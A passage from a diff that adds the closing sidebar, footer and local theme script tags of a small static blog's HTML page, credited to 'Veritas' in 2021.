+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/erictanghulu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;erictanghulu" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Veritas</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
